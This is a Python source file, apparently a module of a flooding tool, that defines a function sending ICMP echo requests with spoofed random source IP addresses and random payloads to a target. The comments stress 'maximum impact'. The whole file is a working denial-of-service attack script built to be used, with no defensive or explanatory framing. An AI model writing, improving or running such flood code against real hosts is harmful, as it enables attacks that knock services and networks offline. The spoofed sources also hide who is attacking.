# Import modules
import random
from scapy.all import IP, ICMP, send
import tools.randomData as randomData
from colorama import Fore


def flood(target: tuple[str, int]) -> None:
    """Send ICMP echo request packets to target.
    
    Optimized version with increased packet count and random payload variation.
    
    Args:
        target: Tuple of (ip_address, port)
    """
    # Increased packet count for maximum impact
    PACKET_COUNT = 16
    
    for _ in range(PACKET_COUNT):
        try:
            # Generate random payload for variation
            payload = randomData.random_bytes(1, 256)
            packet = IP(dst=target[0], src=randomData.random_IP()) / ICMP(type=8, code=0) / payload
            send(packet, verbose=False)
        except PermissionError:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
            )
            break
        except OSError as e:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending ICMP: {e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}ICMP packet sent to {target[0]}{Fore.RESET}"
            )
